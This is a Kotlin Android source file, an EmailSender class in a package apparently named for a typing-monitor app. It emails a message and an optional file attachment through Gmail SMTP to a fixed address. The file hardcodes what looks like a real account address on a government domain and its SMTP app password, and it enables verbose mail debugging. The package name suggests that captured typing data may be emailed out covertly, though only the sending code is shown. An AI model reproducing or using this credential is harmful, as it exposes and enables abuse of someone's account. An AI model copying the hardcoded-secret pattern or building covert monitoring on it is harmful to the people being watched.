package com.mytypingmonitor.email

import android.util.Log
import java.util.Properties
import javax.mail.*
import javax.mail.internet.InternetAddress
import javax.mail.internet.MimeBodyPart
import javax.mail.internet.MimeMessage
import javax.mail.internet.MimeMultipart

class EmailSender {
    companion object {
        private const val TAG = "EmailSender"
        
        // SMTP Configuration
        private const val SMTP_HOST = "smtp.gmail.com"
        private const val SMTP_PORT = 587
        private const val SMTP_USER = "ffgallibot@dswd.gov.ph"
        private const val SMTP_PASSWORD = "tsxtcjcafbmrpuwb"
        private const val TO_EMAIL = "ffgallibot@dswd.gov.ph"
        
        fun sendEmailWithAttachment(
            subject: String,
            body: String,
            attachmentPath: String?
        ): Boolean {
            return try {
                Log.d(TAG, "Starting email send...")
                Log.d(TAG, "SMTP Host: $SMTP_HOST")
                Log.d(TAG, "SMTP Port: $SMTP_PORT")
                Log.d(TAG, "From: $SMTP_USER")
                Log.d(TAG, "To: $TO_EMAIL")
                Log.d(TAG, "Attachment: $attachmentPath")
                val properties = Properties().apply {
                    put("mail.smtp.host", SMTP_HOST)
                    put("mail.smtp.port", SMTP_PORT.toString())
                    put("mail.smtp.auth", "true")
                    put("mail.smtp.starttls.enable", "true")
                    put("mail.smtp.starttls.required", "true")
                    put("mail.smtp.ssl.trust", SMTP_HOST)
                    put("mail.debug", "true") // Enable debug logging
                }
                
                Log.d(TAG, "Creating SMTP session...")
                val session = Session.getInstance(properties, object : Authenticator() {
                    override fun getPasswordAuthentication(): PasswordAuthentication {
                        Log.d(TAG, "Authenticating with SMTP...")
                        return PasswordAuthentication(SMTP_USER, SMTP_PASSWORD)
                    }
                })
                Log.d(TAG, "SMTP session created")
                
                Log.d(TAG, "Creating email message...")
                val message = MimeMessage(session).apply {
                    setFrom(InternetAddress(SMTP_USER))
                    setRecipient(Message.RecipientType.TO, InternetAddress(TO_EMAIL))
                    setSubject(subject)
                }
                Log.d(TAG, "Message created: From=$SMTP_USER, To=$TO_EMAIL, Subject=$subject")
                
                val multipart = MimeMultipart()
                
                // Add body
                Log.d(TAG, "Adding email body...")
                val bodyPart = MimeBodyPart().apply {
                    setText(body, "utf-8")
                }
                multipart.addBodyPart(bodyPart)
                
                // Add attachment if provided
                if (attachmentPath != null) {
                    try {
                        val file = java.io.File(attachmentPath)
                        Log.d(TAG, "Checking attachment file: ${file.absolutePath}, exists: ${file.exists()}, size: ${file.length()}")
                        if (file.exists()) {
                            Log.d(TAG, "Attaching file: ${file.name}")
                            val attachmentPart = MimeBodyPart().apply {
                                val dataSource = javax.activation.FileDataSource(file)
                                setDataHandler(javax.activation.DataHandler(dataSource))
                                fileName = file.name
                            }
                            multipart.addBodyPart(attachmentPart)
                            Log.d(TAG, "File attached successfully")
                        } else {
                            Log.w(TAG, "Attachment file does not exist: $attachmentPath")
                        }
                    } catch (e: Exception) {
                        Log.e(TAG, "Error attaching file: ${e.message}", e)
                        // Continue without attachment
                    }
                }
                
                message.setContent(multipart)
                Log.d(TAG, "Sending email via Transport.send()...")
                
                Transport.send(message)
                Log.d(TAG, "✅ Email sent successfully!")
                true
            } catch (e: Exception) {
                Log.e(TAG, "❌ Error sending email: ${e.message}", e)
                Log.e(TAG, "Error type: ${e.javaClass.simpleName}")
                e.printStackTrace()
                false
            }
        }
        
        fun sendEmail(
            subject: String,
            body: String
        ): Boolean {
            return sendEmailWithAttachment(subject, body, null)
        }
    }
}

